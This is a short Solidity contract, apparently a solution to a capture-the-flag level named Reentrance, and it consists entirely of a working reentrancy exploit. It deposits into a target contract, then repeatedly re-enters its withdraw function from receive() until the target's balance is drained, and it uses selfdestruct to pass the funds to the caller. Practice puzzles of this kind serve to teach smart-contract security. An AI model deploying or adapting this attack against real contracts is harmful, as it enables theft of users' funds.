//  SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

interface Reentrance {
    function donate(address _to) external payable; 
    function withdraw(uint) external;
}

contract HackReentrance {
    Reentrance toHack;
    uint calls;

    constructor(address _toHack) {
        toHack = Reentrance(_toHack);
    }

    function donate() external payable {
        toHack.donate{value:msg.value}(address(this));
    }

    function emptyContract(uint256 _amount) external {
        toHack.withdraw(_amount);
    }

    function withdrawal() external {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        if (address(toHack).balance > 0) {
            toHack.withdraw(msg.value);
        }
    }
}
